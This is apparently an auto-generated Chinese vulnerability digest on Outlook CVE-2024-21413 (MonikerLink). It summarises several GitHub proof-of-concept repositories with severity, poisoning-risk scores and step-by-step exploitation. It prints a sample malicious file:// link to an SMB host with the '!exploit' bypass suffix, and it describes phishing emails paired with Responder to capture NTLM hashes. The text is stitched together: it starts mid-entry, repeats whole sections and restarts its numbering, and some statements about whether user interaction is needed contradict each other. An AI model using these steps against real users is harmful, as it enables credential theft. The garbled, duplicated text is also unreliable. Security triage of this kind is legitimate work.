根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

